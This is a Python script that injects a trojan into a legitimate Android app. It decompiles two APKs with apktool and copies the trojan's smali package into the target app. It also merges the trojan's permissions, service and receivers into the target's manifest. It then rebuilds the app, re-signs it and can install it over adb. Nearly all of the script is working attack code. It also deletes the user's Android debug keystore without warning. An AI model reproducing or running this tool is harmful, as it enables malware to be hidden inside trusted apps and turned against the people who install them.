__author__ = 'remijouannet'

import xml.etree.ElementTree as ET
import fileinput
from subprocess import call
import argparse
import os
import shutil
import sys
import glob

apktool = "/home/hoodlums/apktool/apktool"
TempDirectory = '/tmp/MixApk/'

packageToInject = 'trojan.android.android_trojan.action'

apk1 = TempDirectory + 'apk1.apk'
apk2 = TempDirectory + 'apk2.apk'

apk1Directory = TempDirectory + 'apk1/'
apk2Directory = TempDirectory + 'apk2/'

apk1Manifest = apk1Directory + 'AndroidManifest.xml'
apk2Manifest = apk2Directory + 'AndroidManifest.xml'

apk1Smali = apk1Directory + 'smali/'
apk2Smali = apk2Directory + 'smali/'

apk2Dist = apk2Directory + 'dist/'
apk2DistApk = apk2Dist + 'apk2.apk'

class ParseArgs:
    def __init__(self):
        self.parser = argparse.ArgumentParser(description='ACTION')
        self.parser.add_argument('--apks', dest='apks', action='store', metavar=('trojanApk', 'apkToInfect'), nargs=2,
                                 default=False,
                                 help='specify the Trojan Apk and the APk to Infect')
        self.parser.add_argument('--adb', dest='adb', action='store_true',default=False,
                                 help='install the final APK with adb')
        self.args = self.parser.parse_args()

    def getargs(self):
        return self.args


class ParseManifest:
    def __init__(self, manifest):
        ET.register_namespace("android", "http://schemas.android.com/apk/res/android")
        self.file = manifest
        self.manifest = ET.parse(manifest)
        self.root = self.manifest.getroot()
        self.application = self.manifest.find('application')
        self.permissions = []
        self.services = []
        self.receiver = []
        self.nodePermissions = []
        self.nodeServices = []
        self.nodeReceiver = []
        self.mainactivity = None
        self.mainpackage = None

    def findMainActivity(self):
        if self.mainactivity is None:
            for child in self.root.iter('activity'):
                for child0 in child:
                    for child1 in child0:
                        if child1.get('{http://schemas.android.com/apk/res/android}name') == 'android.intent.action.MAIN':
                            self.mainactivity = child.get('{http://schemas.android.com/apk/res/android}name')
                            return self.mainactivity
        else:
            return self.mainactivity

    def findMainPackage(self, ):
        if self.mainpackage is None:
            self.mainpackage = self.root.get('package')
        return self.mainpackage

    def listPermissions(self):
        if len(self.permissions) == 0:
            for child in self.root.iter('uses-permission'):
                self.permissions.append(child.get('{http://schemas.android.com/apk/res/android}name'))
        return self.permissions

    def listService(self):
        if len(self.services) == 0:
            for child in self.root.iter('service'):
                self.services.append(child.get('{http://schemas.android.com/apk/res/android}name'))
        return self.services

    def listReceiver(self):
        if len(self.receiver) == 0:
            for child in self.root.iter('receiver'):
                self.receiver.append(child.get('{http://schemas.android.com/apk/res/android}name'))
        return self.receiver

    def listNodePermissions(self):
        if len(self.nodePermissions) == 0:
            for child in self.root.iter('uses-permission'):
                self.nodePermissions.append(child)
        return self.nodePermissions

    def listNodeService(self):
        if len(self.nodeServices) == 0:
            for child in self.root.iter('service'):
                self.nodeServices.append(child)
        return self.nodeServices

    def listNodeReceiver(self):
        if len(self.nodeReceiver) == 0:
            for child in self.root.iter('receiver'):
                self.nodeReceiver.append(child)
        return self.nodeReceiver


class EditManifest(ParseManifest):
    def __init__(self, manifest):
        ParseManifest.__init__(self, manifest=manifest)

    def write(self):
        self.manifest.write(self.file)

    def addService(self, node, mainpackage):
        if type(node) is list:
            for service in node:
                service.set('{http://schemas.android.com/apk/res/android}name',
                            service.get('{http://schemas.android.com/apk/res/android}name').replace(mainpackage, self.findMainPackage()))
                self.application.append(service)
        else:
            node.set('{http://schemas.android.com/apk/res/android}name',
                            node.get('{http://schemas.android.com/apk/res/android}name').replace(mainpackage, self.findMainPackage()))
            self.application.append(node)
        self.write()

    def addReceiver(self, node, mainpackage):
        if type(node) is list:
            for receiver in node:
                receiver.set('{http://schemas.android.com/apk/res/android}name',
                            receiver.get('{http://schemas.android.com/apk/res/android}name').replace(mainpackage, self.findMainPackage()))
                self.application.append(receiver)
        else:
            node.set('{http://schemas.android.com/apk/res/android}name',
                            node.get('{http://schemas.android.com/apk/res/android}name').replace(mainpackage, self.findMainPackage()))
            self.application.append(node)
        self.write()

    def addPermissions(self, node):
        if type(node) is list:
            for permission0 in node:
                change = True
                for permission1 in self.listPermissions():
                    if permission0.get('{http://schemas.android.com/apk/res/android}name') == permission1:
                        change = False
                if change:
                    self.root.append(permission0)
        else:
            for permission in self.listPermissions():
                if permission == node.get('{http://schemas.android.com/apk/res/android}name'):
                    return
            self.root.append(node)
        self.write()


def error(message, ex, code):
    print(message)
    if ex:
        print(ex)
    sys.exit(code)

def sed(file, old, new):
    for line in fileinput.input(file, inplace=True):
        print(line.replace(old, new))


if not os.path.exists(TempDirectory):
    os.makedirs(TempDirectory)

args = ParseArgs().getargs()

if args.apks and os.path.isfile(args.apks[0]) and os.path.isfile(args.apks[1]):
    try:
        shutil.copyfile(args.apks[0], apk1)
        shutil.copyfile(args.apks[1], apk2)
    except IOError as ex:
        error("can't copy the apks to " + TempDirectory, str(ex), 1)
else:
    error("please specify the two apks in args, example : python mixapk.py apk1.apk apk2.apk", None, 2)


try:
    call(apktool + " d -v -f -o " + apk1Directory + " " + apk1, shell=True)
    call(apktool + " d -v -f -o " + apk2Directory + " " + apk2, shell=True)
except OSError as ex:
    error("can't extract the two apk", str(ex), 1)

ParseManifest1 = ParseManifest(manifest=apk1Manifest)
ParseManifest2 = ParseManifest(manifest=apk2Manifest)

EditManifest1 = EditManifest(manifest=apk1Manifest)
EditManifest2 = EditManifest(manifest=apk2Manifest)

apk1Action = apk1Smali + packageToInject.replace('.', '/') + '/'
apk2Action = apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/'

shutil.copytree(apk1Smali + packageToInject.replace('.', '/') + '/',
            apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/')

for file in glob.glob(apk2Action + '*.smali'):
    sed(file, ParseManifest1.findMainPackage().replace('.', '/'), ParseManifest2.findMainPackage().replace('.', '/'))

EditManifest2.addPermissions(ParseManifest1.listNodePermissions())
EditManifest2.addService(ParseManifest1.listNodeService()[0], ParseManifest1.findMainPackage())
EditManifest2.addReceiver(ParseManifest1.listNodeReceiver(), ParseManifest1.findMainPackage())

try:
    call(apktool + " b -d -f " + apk2Directory, shell=True)
except OSError as ex:
    error("can't build " + apk2Directory , str(ex), 1)


try:
    cd = os.getcwd()
    os.chdir(apk2Dist)

    if os.path.exists(apk2Dist + 'app-debug2.apk'):
        os.remove(apk2Dist + 'app-debug2.apk')
    if os.path.exists(apk2Dist + 'app-debug.apk'):
        os.remove(apk2Dist + 'app-debug.apk')
    if os.path.exists(cd + '/app-debug2.apk'):
        os.remove(cd + '/app-debug2.apk')
    if os.path.exists(os.path.expanduser('~') + '/.android/debug.keystore'):
        os.remove(os.path.expanduser('~') + '/.android/debug.keystore')

    shutil.copyfile(apk2DistApk, apk2Dist + 'app-debug.apk')

    call('~/android/sdk/build-tools/21.1.1/zipalign -v 4 app-debug.apk app-debug2.apk', shell=True)
    call('keytool -genkey -v -keystore ~/.android/debug.keystore -alias sample -keyalg RSA -keysize 2048 -validity 20000', shell=True)
    call('jarsigner -verbose -keystore ~/.android/debug.keystore app-debug2.apk sample', shell=True)
    call('jarsigner -verify app-debug2.apk', shell=True)

    if os.path.exists(os.path.expanduser('~') + '/.android/debug.keystore'):
        os.remove(os.path.expanduser('~') + '/.android/debug.keystore')

    if args.adb:
        call('~/android/sdk/platform-tools/adb install app-debug2.apk', shell=True)

    shutil.copyfile(apk2Dist + 'app-debug2.apk', cd + '/app-final.apk')
except OSError as ex:
    error("can't build " + apk2Directory , str(ex), 1)
